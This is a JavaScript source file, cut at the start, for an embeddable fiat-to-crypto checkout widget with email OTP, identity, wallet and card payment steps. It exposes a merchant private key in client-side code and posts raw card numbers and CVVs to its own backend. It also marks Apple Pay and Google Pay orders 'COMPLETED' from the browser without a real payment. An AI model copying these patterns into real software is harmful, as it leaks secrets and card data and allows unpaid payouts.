         <span style="font-size: 12px;">Network Fee</span>
         <span style="font-size: 12px;" id="networkFee"></span>
      </div>
   </div>
   <div class="cw_card">
      <div style="display: flex; align-items: center; gap: 2px;">
         <img src="${warning_icon}" alt="" class="warning-icon"/>
         <strong style="color: #aa2e26;">Sending cryptocurrency to someone else?</strong>
      </div>
     
      <p style="font-size: 12px; color: #aa2e26;">
         Make sure you aren't sending crypto to any investment scam instructed by a third party.
         There is a big risk of fraud. <strong>example.com</strong> is not affiliated with any third parties and will never directly contact you.
      </p>
   </div>
   <div class="cw_actions" >
      <button type="submit" class="submit_button" id="cw-summary-btn">
      Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
   </div>
</form>
`;

const toAddressForm = `
  <form class="cw_form" style="text-align: center;" id="cw-to-address-form">
   <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
    <div style="margin-bottom: 10px;">
      <img id="receiver_icon" src="" alt="" style="width: 40px; height: 40px;" />
    </div>

    <h2 style="margin-bottom: 10px;">
  Enter <span id="receiver_currency" style="font-size: inherit;">""</span> Address
</h2>

    <p  style="margin-bottom: 20px; font-size: 14px; color: #555;">
      Use a wallet that supports <strong id="receiver_currency">""</strong>. Make sure the address is correct to avoid losing your <span class="receiver_currency">""</span>.
    </p>

     <div class="cw_form-group">
      <label for="receiver-address" class="cw_input-label">Your <span id="receiver_currency">""</span> Address</label>
      <input
        type="text"
        id="receiver-address"
        class="cw_input"
        placeholder="Enter your wallet address"
        required
      />
    </div>

    <div class="cw_actions" style="margin-top: 24px;">
      <button type="submit" class="submit_button" id="cw-toaddress-btn">
        Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
    </div>
  </form>
`;

const verifyKeyForm = `
  <form class="cw_form" id="cw-verify-form">
    <h2 style="text-align: center;">Verify</h2>

    <div class="cw_form-group">
      <label class="cw_input-label" for="cw-private-key">Enter Private key</label>
      <input
        type="text"
        id="cw-private-key"
        class="cw_input"
        placeholder="Private Key"
        required
      />
    </div>

    <div class="cw_form-group">
      <label class="cw_input-label" for="cw-public-key">Enter Public key</label>
      <input
        type="text"
        id="cw-public-key"
        class="cw_input"
        required
      placeholder="Public Key"
      />
    </div>

    <div class="cw_actions">
      <button type="submit" class="submit_button" id="cw-verify-btn" style="width: 100%;">
        Continue <span style="margin-left: 6px;">&#8594;</span>
      </button>
    </div>
  </form>
`;

const visacardForm = `
<form class="cw_form" style="text-align: center;" id="cw-visa-form">
  <img class="cw-back-btn input-icon" src="${back_icon}" alt="Back" style="cursor:pointer;" />
  <div class="visa_card_icon" style="margin-bottom: 16px;">
    <img src="${visa_icon}" alt="Visa" style="width: 120px;" />
  </div>
  <h2>Pay with Credit Card</h2>
  <p style="font-size: 14px; color: #8c8c8c; margin-bottom: 20px;">
    All card information is securely encrypted
  </p>

  <!-- Stripe Card Element will mount here -->
  <div id="card-element" class="cw_input" style="padding: 12px; border: 1px solid #ccc; border-radius: 8px;"></div>
  <div id="card-errors" style="color: red; margin-top: 8px;"></div>

  <p style="font-size: 13px; color: #666; margin-top: 12px;">
    By paying, you accept example.com
    <a href="https://example.com/terms" target="_blank" style="color: #007bff; text-decoration: underline;">
      Terms of Use
    </a>
  </p>
  <div class="cw_actions" style="margin-top: 24px;">
    <button type="submit" class="submit_button" id="cw-visa-btn">
      Continue <span style="margin-left: 6px;">&#8594;</span>
    </button>
  </div>
</form>
`;

let fees = null;
let activeInput = null;
let markup = null;
let price = null;

function main() {
  const currentScript = document.currentScript;

  const privateKey = currentScript?.getAttribute("data-private-key");

  const publicKey = currentScript?.getAttribute("data-public-key");

  async function verifyKeys() {
    try {
      const currentUrl = window.location.origin;

      const res = await fetch(`${url}/verify`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ privateKey, publicKey, url: currentUrl }),
      });

      const data = await res.json();

      if (data.success) {
        verifiedResponse = data;

        const { token, merchantId } = data?.body;
        showStep("convert");

        const fees_result = await fetch(`${url}/checkout-fees/${merchantId}`, {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
        });

        const _ = await fees_result.json();
        fees = _;

        //
      } else {
        alert(data.error || "Verification failed");
      }
    } catch (err) {
      alert("Error verifying keys.");
    }
  }

  if (privateKey && publicKey) {
    verifyKeys();
  }

  const cssFiles = [
    `${baseURL}/css/common.css`,
    `${baseURL}/css/verify_keys.css`,
    `${baseURL}/css/convert.css`,
    `${baseURL}/css/emailOTP.css`,
    `${baseURL}/css/info.css`,
    `${baseURL}/css/summary.css`,
    `${baseURL}/css/visa.css`,
    `${baseURL}/css/order.css`,
  ];

  cssFiles.forEach((file) => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = file;
    document.head.appendChild(link);
  });

  // Create modal
  const modalOverlay = document.createElement("div");
  modalOverlay.id = "cw-modal";

  modalOverlay.style.display = "flex";

  modalOverlay.innerHTML = `
   <div class="cw_popup">
      
      ${convert_form}
      ${emailVerification}
      ${emailOTPPage}
      ${infoForm}
      ${toAddressForm}
      ${summaryForm}
      ${visacardForm}
      ${OrderForm}
      ${appleScannerForm}
      ${applePayForm}
      ${googlePayForm}
      ${payWithGpayForm}
      ${successPage}
   </div>

`;

  document.body.appendChild(modalOverlay);

  const convert = document.getElementById("cw-convert-form");
  const emailForm = document.getElementById("cw-email-form");
  const otp = document.getElementById("cw-email-otp-form");
  const info = document.getElementById("cw-info-form");
  const toAddress = document.getElementById("cw-to-address-form");
  const summary = document.getElementById("cw-summary-form");
  const visa = document.getElementById("cw-visa-form");
  const order = document.getElementById("cw-order-form");
  const appleScan = document.getElementById("cw-apple-scanner-form");
  const applePay = document.getElementById("cw-apple-pay-form");
  const gPayConfirm = document.getElementById("cw-google-form");
  const gPay = document.getElementById("cw-gPay-form");
  const success = document.getElementById("success-form");

  let screenHistory = [];
  showStep("convert", true);

  // Back button (convert → verify)
  document.querySelectorAll(".cw-back-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      screenHistory.pop(); // Remove current step
      const previousStep = screenHistory[screenHistory.length - 1];
      if (previousStep) {
        showStep(previousStep, false); // Do not push again
      }
    });
  });

  // Switch step
  function showStep(step, pushToHistory = false) {
    convert.style.display = step === "convert" ? "flex" : "none";
    emailForm.style.display = step === "email" ? "flex" : "none";
    otp.style.display = step === "otp" ? "flex" : "none";
    info.style.display = step === "info" ? "flex" : "none";
    toAddress.style.display = step === "toAddress" ? "flex" : "none";
    summary.style.display = step === "summary" ? "flex" : "none";
    visa.style.display = step === "Card" ? "flex" : "none";
    order.style.display = step === "order" ? "flex" : "none";
    appleScan.style.display = step === "Apple Pay" ? "flex" : "none";
    applePay.style.display = step === "applePay" ? "flex" : "none";
    gPayConfirm.style.display = step === "Google Pay" ? "flex" : "none";
    gPay.style.display = step === "gPay" ? "flex" : "none";
    success.style.display = step === "success" ? "flex" : "none";

    if (pushToHistory) {
      screenHistory.push(step);
    }
  }

  // Step 2: Conversion form logic
  const fiatAmount = document.getElementById("cw-from-amount");
  const toAmountEl = document.getElementById("cw-to-amount");

  const fiatCurrencyEl = document.getElementById("from-currency");
  const toCurrencyEl = document.getElementById("to-currency");

  const countryEl = document.getElementById("countryField");

  async function fetchRateAndConvert() {
    const from = fiatCurrencyEl.innerText;

    const to =
      toCurrencyEl.innerText === "USDC_ERC20" ||
      toCurrencyEl.innerText === "USDC_BSC" ||
      toCurrencyEl.innerText === "USDC_POLYGON" ||
      toCurrencyEl.innerText === "USDC_TRC20"
        ? "USDC"
        : toCurrencyEl.innerText === "USDT_ERC20" ||
          toCurrencyEl.innerText === "USDT_POLYGON" ||
          toCurrencyEl.innerText === "USDT_TRC20" ||
          toCurrencyEl.innerText === "USDT_BSC"
        ? "USDT"
        : toCurrencyEl.innerText;

    const amount = parseFloat(fiatAmount.value);

    if (isNaN(amount) || amount <= 0) return;

    const pair = `${to}${from}`.toUpperCase(); // e.g. BTCUSD
    try {
      const response = await fetch(
        `https://api.kraken.com/0/public/Ticker?pair=${pair}`,
      );
      const result = await response.json();

      const ticker = result.result?.[Object.keys(result.result)[0]];
      const rate = parseFloat(ticker?.c?.[0]); // closing price

      if (rate) {
        const fxMarkupItem =
          fees?.body?.merchant?.User?.PriceList?.FxMarkupFees.find(
            (item) =>
              (item?.fromCurrencyId === "ANY" ||
                item?.fromCurrencyId === from) &&
              (item?.toCurrencyId === "ANY" || item?.toCurrencyId === to),
          );

        const fxMarkup = fxMarkupItem?.percent ?? 0;

        let converted = amount / rate;

        if (fxMarkup) {
          const markupMultiplier = 1 - fxMarkup / 100;
          converted *= markupMultiplier;
        }

        markup = fxMarkup;
        price = rate;

        toAmountEl.value = converted;
      } else {
        toAmountEl.value = "";
      }
    } catch (err) {
      toAmountEl.value = "";
    }
  }

  fiatAmount.addEventListener("input", fetchRateAndConvert);

  let selectedMethod = "Card"; // default

  document.querySelectorAll(".payment-card").forEach((card) => {
    card.addEventListener("click", () => {
      // Remove selected class from all
      document
        .querySelectorAll(".payment-card")
        .forEach((c) => c.classList.remove("selected"));

      // Add selected class to clicked card
      card.classList.add("selected");

      // Store selected payment method
      selectedMethod = card.getAttribute("data-method");
    });
  });

  // convert submit
  convert.addEventListener("submit", async (e) => {
    e.preventDefault();

    const fiatCurrency = fiatCurrencyEl.innerText;
    const amount = parseFloat(fiatAmount.value.trim());
    const receiverCurrency = toCurrencyEl.innerText;
    const receiverAmount = parseFloat(toAmountEl.value);
    const country = countryEl.innerText;

    if (!amount) {
      alert("Amount is required");
      return;
    }

    const networkFee =
      fees?.body?.merchant?.User?.PriceList?.TransferFees?.find(
        (item) =>
          item?.operationType === 3 &&
          (item?.currencyId === "ANY" || item?.currencyId === fiatCurrency),
      );

    const processingFee =
      fees?.body?.merchant?.User?.PriceList?.TransferFees?.find(
        (item) =>
          item?.operationType === 8 &&
          (item?.currencyId === "ANY" || item?.currencyId === fiatCurrency),
      );

    const calculateFee = (feeObj) => {
      const fixed = Number(feeObj?.fixedFee ?? 0);
      const percent = Number(feeObj?.percent ?? 0);
      return fixed + (percent * amount) / 100;
    };

    const networkFeeValue = networkFee ? calculateFee(networkFee) : 0;

    const processingFeeValue = processingFee ? calculateFee(processingFee) : 0;

    const totalFees = networkFeeValue + processingFeeValue;
    const finalFiatAmountWithFees = Number(amount) + Number(totalFees);

    const reqBody = {
      transactionId: verifiedResponse?.body?.transactionId,
      receiverAmount,
      fiatAmount: amount,
      fiatCurrency,
      paymentMethod: selectedMethod,
      receiverCurrency,
      fiatAmountAfterFees: finalFiatAmountWithFees,
      processingFee: processingFeeValue ?? 0,
      networkFee: networkFeeValue ?? 0,
      fxmarkUp: markup ?? 0,
      price: price ?? 0,
      country: country,
    };

    const btn = document.getElementById("cw-convert-btn");
    btn.textContent = "Submitting...";
    btn.disabled = "true";
    btn.style.setProperty("background-color", "#808080", "important");

    const { transactionId, token } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/transactions/${transactionId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(reqBody),
      });

      const data = await res.json();
      btn.textContent = "Submit";
      btn.disabled = false;
      btn.style.setProperty("background-color", "#4d00ec", "important");

      if (data.success) {
        showStep("email", true);
        verifiedResponse = {
          ...verifiedResponse,
          ...reqBody,
        };
      } else {
        alert(data.error || "Conversion failed");
      }
    } catch (err) {
      alert("Error submitting conversion.");

      btn.textContent = "Submit";
      btn.disabled = false;
      btn.style.setProperty("background-color", "#4d00ec", "important");
    }
  });

  // convert form
  const bottomPopup = document.getElementById("bottomPopup");
  const popupTitle = document.getElementById("popupTitle");
  const closePopupBtn = document.getElementById("closePopupBtn");
  const popupSearch = document.getElementById("popupSearch");
  const popupList = document.getElementById("popupList");
  const inputField1 = document.getElementById("inputField1");
  const inputField2 = document.getElementById("inputField2");
  const countryField = document.getElementById("countryField");

  [inputField1, inputField2, countryField].forEach((input) => {
    input.addEventListener("click", (e) => {
      e.stopPropagation();
      openPopup(input);
    });
  });

  function openPopup(inputElement) {
    activeInput = inputElement;
    if (inputElement.id === "countryField") {
      popupTitle.textContent = `Select Country`;
    } else {
      popupTitle.textContent = `Select Currency`;
    }

    popupSearch.value = "";
    popupSearch.focus();

    // Populate list based on active input

    const data = options_Data[inputElement.id] || [];
    renderList(data);

    bottomPopup.style.display = "flex";
    bottomPopup.setAttribute("aria-hidden", "false");
  }

  function closePopup() {
    bottomPopup.style.display = "none";
    bottomPopup.setAttribute("aria-hidden", "true");
    activeInput = null;
  }

  closePopupBtn.addEventListener("click", () => {
    closePopup();
  });

  function renderList(items) {
    popupList.innerHTML = "";
    if (items.length === 0) {
      popupList.innerHTML = `<li class="no-results">No options found.</li>`;
      return;
    }
    items.forEach((item) => {
      const li = document.createElement("li");
      li.tabIndex = 0;

      // Clear existing content
      li.innerHTML = "";

      // Create img icon element
      const img = document.createElement("img");
      img.src = item.icon;
      img.alt = "";
      img.classList.add("popup-icon");
      img.setAttribute("aria-hidden", "true");

      // Create text span
      const textSpan = document.createElement("span");
      textSpan.textContent = item.name;
      textSpan.classList.add("popup-text");

      li.appendChild(img);
      li.appendChild(textSpan);

      li.addEventListener("click", () => {
        if (activeInput) {
          // Set input text
          activeInput.value = item.name;

          // Show icon inside input
          showInputIcon(activeInput, item.icon, item.name);
        }
        closePopup();
      });
      li.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          li.click();
        }
      });
      popupList.appendChild(li);
    });
  }

  function showInputIcon(inputElem, iconSrc, altText) {
    let container, img, text;
    if (inputElem.id === "inputField1") {
      container = inputField1;
    } else if (inputElem.id === "inputField2") {
      container = inputField2;
    } else if (inputElem.id === "countryField") {
      container = countryField;
    }

    if (!container) return;
    img = container.querySelector(".input-icon");
    if (img) {
      img.src = iconSrc;
      img.alt = altText + " icon";
      img.style.display = "inline-block";
    }

    if (inputElem.id === "countryField") {
      text = container.querySelector(".country_name");

      if (text) {
        text.textContent = altText;
      }
    } else {
      text = container.querySelector(".currency_name");

      if (text) {
        text.textContent = altText;
        fetchRateAndConvert();
      }
    }
  }

  popupSearch.addEventListener("input", () => {
    if (!activeInput) return;
    const data = options_Data[activeInput.id] || [];
    const filtered = data.filter((item) =>
      item?.name?.toLowerCase().includes(popupSearch.value.toLowerCase()),
    );
    renderList(filtered);
  });

  // email
  emailForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const emailInput = document.getElementById("cw-email");
    const email = emailInput.value.trim();

    if (!email) {
      alert("Email is required");
      return;
    }

    const btn = document.getElementById("cw-email-btn");
    loadButton(btn);

    const { transactionId, token } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/send-otp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          transactionId,
          email,
        }),
      });

      const data = await res.json();
      noloadButton(btn);

      if (data.success) {
        verifiedResponse = {
          ...verifiedResponse,
          email,
        };

        document.getElementById("selected_email").textContent = email;

        showStep("otp", true); // Proceed to OTP entry step
      } else {
        alert(data.error || "OTP request failed");
      }
    } catch (err) {
      alert("Error submitting email.");

      btn.textContent = "Submit";
      btn.disabled = false;
      btn.style.setProperty("background-color", "#4d00ec", "important");
    }
  });

  // email otp verification
  document.querySelectorAll(".otp_input").forEach((input, index, inputs) => {
    input.addEventListener("input", () => {
      if (input.value && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  // OTP form submit
  otp.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = document.getElementById("cw-otp-btn");

    loadButton(btn);

    // Collect 6-digit OTP
    const otpInputs = document.querySelectorAll(".otp_input");
    const otpCode = Array.from(otpInputs)
      .map((input) => input.value.trim())
      .join("");

    if (otpCode.length !== 6 || /\D/.test(otpCode)) {
      alert("Please enter a valid 6-digit OTP");
      noloadButton(btn);
      return;
    }

    const { transactionId, token } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/verify-otp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          transactionId,
          otp: otpCode, // Send the collected OTP
        }),
      });

      const data = await res.json();
      noloadButton(btn);

      if (data.success) {
        showStep("info", true); // Proceed to next step (update this as needed)
      } else {
        alert(data.message || "OTP verification failed");
      }
    } catch (err) {
      alert("Error verifying OTP.");

      noloadButton(btn);
    }
  });

  // information submit
  info.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = document.getElementById("cw-info-btn");
    loadButton(btn);

    // Get values
    const firstName = document.getElementById("first-name").value.trim();
    const lastName = document.getElementById("last-name").value.trim();
    const dobInputs = document.querySelectorAll(
      ".cw_input[placeholder='DD'], .cw_input[placeholder='MM'], .cw_input[placeholder='YYYY']",
    );

    const customerCountry = document
      .getElementById("customerCountry")
      .value.trim();
    const address = document.getElementById("address").value.trim();
    const city = document.getElementById("city").value.trim();
    const zip = document.getElementById("zip").value.trim();

    const [day, month, year] = Array.from(dobInputs).map((input) =>
      input.value.trim(),
    );

    if (
      !firstName ||
      !lastName ||
      !day ||
      !month ||
      !year ||
      !customerCountry ||
      !city ||
      !zip ||
      !address
    ) {
      alert("Please fill all fields.");
      noloadButton(btn);
      return;
    }

    // Combine DOB into a single string
    const dob = `${year}-${month.padStart(2, "0")}-${day.padStart(2, "0")}`; // Format: YYYY-MM-DD

    const { transactionId, token } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/transactions/${transactionId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          transactionId,
          firstName,
          lastName,
          dob,
          customerCountry,
          customerAddress: address,
          customerCity: city,
          customerZipcode: zip,
        }),
      });

      const data = await res.json();
      noloadButton(btn);

      if (data.success) {
        // Get the receiver currency from your data or fallback to "BTC"
        const toCurrency = verifiedResponse?.receiverCurrency || "BTC";
        const iconPath = `${baseURL}/assets/currency/${toCurrency}.svg`;

        // Update content using IDs
        document.getElementById("receiver_icon").src = iconPath;
        document.getElementById("receiver_icon").alt = toCurrency;

        document.querySelectorAll("#receiver_currency").forEach((el) => {
          el.textContent = toCurrency;
        });

        document.querySelectorAll(".receiver_currency").forEach((el) => {
          el.textContent = toCurrency;
        });

        if (verifiedResponse?.body?.payoutType === "dedicated") {
          const receiverInput = document.getElementById("receiver-address");
          receiverInput.value = verifiedResponse?.body?.walletAddress || "";
          receiverInput.disabled = true;
        }

        verifiedResponse = {
          ...verifiedResponse,
          firstName,
          lastName,
          customerCountry,
          customerAddress: address,
          customerCity: city,
          customerZipcode: zip,
        };

        showStep("toAddress", true); // Proceed to the next step
      } else {
        alert(data.message || "Submission failed");
      }
    } catch (err) {
      alert("Error submitting information.");
      noloadButton(btn);
    }
  });

  // to address submit
  toAddress.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = document.getElementById("cw-toaddress-btn");

    const receiverAddress = document
      .getElementById("receiver-address")
      .value.trim();

    if (!receiverAddress) {
      alert("Wallet address is required");
      noloadButton(btn);
      return;
    }

    loadButton(btn);

    const { transactionId, token } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/transactions/${transactionId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ transactionId, receiverAddress }),
      });

      const data = await res.json();
      noloadButton(btn);

      if (data.success) {
        verifiedResponse = { ...verifiedResponse, receiverAddress };

        // Populate values
        const toCurrency = verifiedResponse?.receiverCurrency;
        const fromCurrency = verifiedResponse?.fiatCurrency;
        const fiatAmount = verifiedResponse?.fiatAmountAfterFees || "0";
        const cryptoAmount = verifiedResponse?.receiverAmount || "0"; // or from backend
        const receiverAddressValue = receiverAddress;
        const unitPrice = verifiedResponse?.price || "0.0";
        const processingFee = verifiedResponse?.processingFee || "0.0";
        const networkFee = verifiedResponse?.networkFee || "0.0";

        // receiver address
        document.getElementById("receiver-address-summary").value =
          receiverAddressValue;

        document.getElementById("receiver-address-order").textContent =
          receiverAddressValue;

        // Pay row
        const fiatIconPath = `${baseURL}/assets/currency/${fromCurrency}.svg`;

        document.querySelectorAll("#fiat_icon").forEach((el) => {
          el.src = fiatIconPath;
          el.alt = fromCurrency;
        });

        document.querySelectorAll("#fiat_amount").forEach((el) => {
          el.textContent = `${fiatAmount} ${fromCurrency}`;
        });

        // Receive row
        const cryptoIconPath = `${baseURL}/assets/currency/${toCurrency}.svg`;
        document.querySelectorAll("#receiver_icon").forEach((el) => {
          el.src = cryptoIconPath;
          el.alt = toCurrency;
        });

        document.querySelectorAll("#receiver_amount").forEach((el) => {
          el.textContent = `${cryptoAmount.toFixed(6)} ${toCurrency}`;
        });

        document.querySelectorAll("#unitFee").forEach((el) => {
          el.textContent = `${unitPrice} ${fromCurrency}`;
        });

        document.querySelectorAll("#processingFee").forEach((el) => {
          el.textContent = `${processingFee} ${fromCurrency}`;
        });

        document.querySelectorAll("#networkFee").forEach((el) => {
          el.textContent = `${networkFee} ${fromCurrency}`;
        });

        // Populate values
        document.querySelectorAll("#order_id").forEach((el) => {
          el.textContent = verifiedResponse?.body?.transactionId;
        });

        if (verifiedResponse?.paymentMethod === "Apple Pay") {
          const apple_qr = document.getElementById("apple_qr");
          if (apple_qr && receiverAddress) {
            apple_qr.src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(
              receiverAddress,
            )}`;
          }
        }

        showStep("summary", true);
      } else {
        alert(data.message || "Wallet submission failed");
      }
    } catch (err) {
      alert("Error submitting wallet address.");
      noloadButton(btn);
    }
  });

  // summary view
  summary.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = document.getElementById("cw-summary-btn");

    if (verifiedResponse.paymentMethod === "Apple Pay") {
      // Show initial step
      showStep(verifiedResponse.paymentMethod, true);

      // Wait 4 seconds before showing the applePay step
      setTimeout(() => {
        showStep("applePay", true);
      }, 4000);
    } else {
      loadButton(btn);

      const { transactionId, token } = verifiedResponse?.body;

      try {
        const res = await fetch(`${url}/transactions/${transactionId}`, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify({ stripe: true }),
        });

        const data = await res.json();
        noloadButton(btn);

        if (data.success) {
          verifiedResponse = {
            ...verifiedResponse,
          };

          (function () {
            const orig = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function (
              type,
              listener,
              options,
            ) {
              if (type === "touchstart" || type === "touchmove") {
                if (typeof options === "boolean") {
                  options = { capture: options, passive: true };
                } else if (typeof options === "object") {
                  options.passive = true;
                } else {
                  options = { passive: true };
                }
              }
              return orig.call(this, type, listener, options);
            };
          })();

          initStripe(data?.body?.clientSecret);
          // Populate values

          showStep(verifiedResponse.paymentMethod, true);
        } else {
          alert(data.message || "Wallet submission failed");
        }
      } catch (err) {
        alert("Error submitting wallet address.");
        noloadButton(btn);
      }

      // showStep(verifiedResponse.paymentMethod, true);
    }
  });

  // let stripe, elements, card;

  function initStripe(clientSecret) {
    stripe = Stripe(verifiedResponse?.body?.publishKey); // replace with your publishable key
    elements = stripe.elements();

    // Create a Card Element
    card = elements.create("card", {
      style: {
        base: {
          fontSize: "16px",
          color: "#32325d",
          "::placeholder": { color: "#aab7c4" },
        },
      },
    });

    // Mount into div
    card.mount("#card-element");

    // Error handling
    card.on("change", (event) => {
      const displayError = document.getElementById("card-errors");
      displayError.textContent = event.error ? event.error.message : "";
    });

    // Handle form submit
    document
      .getElementById("cw-visa-form")
      .addEventListener("submit", async (e) => {
        e.preventDefault();

        const btn = document.getElementById("cw-visa-btn");
        loadButton(btn);

        const countrySubName = options_Data["countryField"].find(
          (c) => c.name === verifiedResponse?.country,
        )?.subname;

        const { error, paymentIntent } = await stripe.confirmCardPayment(
          clientSecret,
          {
            payment_method: {
              card,
              billing_details: {
                name: verifiedResponse?.firstName
                  ? `${verifiedResponse?.firstName} ${
                      verifiedResponse?.lastName || ""
                    }`
                  : "Unknown",
                email: verifiedResponse?.email || "",
                address: {
                  line1: verifiedResponse?.customerAddress,
                  city: verifiedResponse?.customerCity,
                  postal_code: verifiedResponse?.customerZipcode,
                  country: countrySubName || "US",
                },
              },
            },
          },
        );

        noloadButton(btn);

        if (error) {
          document.getElementById("card-errors").textContent = error.message;
        } else if (paymentIntent.status === "succeeded") {
          // alert("Payment successful 🎉");
          showStep("success", true);
        }
      });
  }

  applePay.addEventListener("submit", async (e) => {
    e.preventDefault();
    orderFunction();
  });

  // card details

  const expiryInput = document.getElementById("card_expiry");
  const expiryError = document.getElementById("expiry-error");

  if (expiryInput && expiryError) {
    expiryInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "").slice(0, 4);
      let formatted = value;

      // Reset error
      expiryError.style.display = "none";
      expiryError.textContent = "";

      if (value.length >= 3) {
        formatted = `${value.slice(0, 2)}/${value.slice(2)}`;
      } else if (value.length >= 1) {
        formatted = value;
      }

      if (value.length >= 2) {
        const month = parseInt(value.slice(0, 2));
        if (month < 1 || month > 12) {
          expiryError.textContent = "Invalid month (01–12)";
          expiryError.style.display = "block";
          return;
        }
      }

      if (value.length === 4) {
        const inputMonth = parseInt(value.slice(0, 2));
        const inputYear = parseInt("20" + value.slice(2));
        const currentDate = new Date();
        const inputDate = new Date(inputYear, inputMonth - 1);
        const currentMonthStart = new Date(
          currentDate.getFullYear(),
          currentDate.getMonth(),
        );

        if (inputDate < currentMonthStart) {
          expiryError.textContent = "Card expired";
          expiryError.style.display = "block";
          return;
        }
      }

      if (/^\d{0,2}(\/\d{0,2})?$/.test(formatted)) {
        e.target.value = formatted;
      }
    }); // ✅ this closing parenthesis was missing
  }

  // card submit
  visa?.addEventListener("submit", async (e) => {
    e.preventDefault();

    const btn = document.getElementById("cw-visa-btn");
    loadButton(btn);

    const cardNumber = document
      .querySelector(".card_number_input")
      .value.trim();
    const expiry = document
      .querySelector(".cw_input[placeholder='MM/YY']")
      .value.trim();
    const cvv = document
      .querySelector(".cw_input[placeholder='CVV']")
      .value.trim();

    if (!cardNumber || !expiry || !cvv) {
      alert("Please fill all card details.");
      noloadButton(btn);
      return;
    }

    // Check expiry date validity
    const [monthStr, yearStr] = expiry.split("/");
    const month = parseInt(monthStr, 10);
    const year = parseInt("20" + yearStr, 10); // Assumes format YY

    if (isNaN(month) || isNaN(year) || month < 1 || month > 12) {
      alert("Invalid expiry date");
      noloadButton(btn);
      return;
    }

    const currentDate = new Date();
    const inputDate = new Date(year, month - 1);
    const currentMonthStart = new Date(
      currentDate.getFullYear(),
      currentDate.getMonth(),
    );

    if (inputDate < currentMonthStart) {
      alert("Card expired");
      noloadButton(btn);
      return;
    }

    const { transactionId, token } = verifiedResponse?.body || {};

    if (!transactionId || !token) {
      alert("Session expired. Please start again.");
      noloadButton(btn);
      return;
    }

    try {
      const res = await fetch(`${url}/transactions/${transactionId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          transactionId,
          cardNumber,
          cardCVV: cvv,
          cardExpiryDate: expiry,
        }),
      });

      const data = await res.json();
      noloadButton(btn);

      if (data.success) {
        orderFunction();
      } else {
        alert(data.message || "Card processing failed");
      }
    } catch (err) {
      alert("Error submitting card.");
      noloadButton(btn);
    }
  });

  gPayConfirm.addEventListener("submit", async (e) => {
    e.preventDefault();
    showStep("gPay", true);
  });

  gPay.addEventListener("submit", async (e) => {
    e.preventDefault();
    orderFunction();
  });

  // Common order page
  async function orderFunction() {
    showStep("order", true);

    // Wait 2 seconds before continuing
    await new Promise((resolve) => setTimeout(resolve, 2000));

    const { token, transactionId } = verifiedResponse?.body;

    try {
      const res = await fetch(`${url}/payout-trx`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          transactionId,
          status: "COMPLETED",
        }),
      });

      const data = await res.json();

      if (data.success) {
        showStep("success");
      } else {
        alert(data.message || "Card processing failed");
      }
    } catch (err) {
      alert("Error submitting card.");
    }
  }

  // Succes Done
  success?.addEventListener("submit", async (e) => {
    e.preventDefault();
    showStep("convert");
  });
}

function loadButton(btn) {
  btn.textContent = "Submitting...";
  btn.disabled = "true";
  btn.style.setProperty("background-color", "#808080", "important");
}

function noloadButton(btn) {
  btn.textContent = "Submit";
  btn.disabled = false;
  btn.style.setProperty("background-color", "#4d00ec", "important");
}

main();
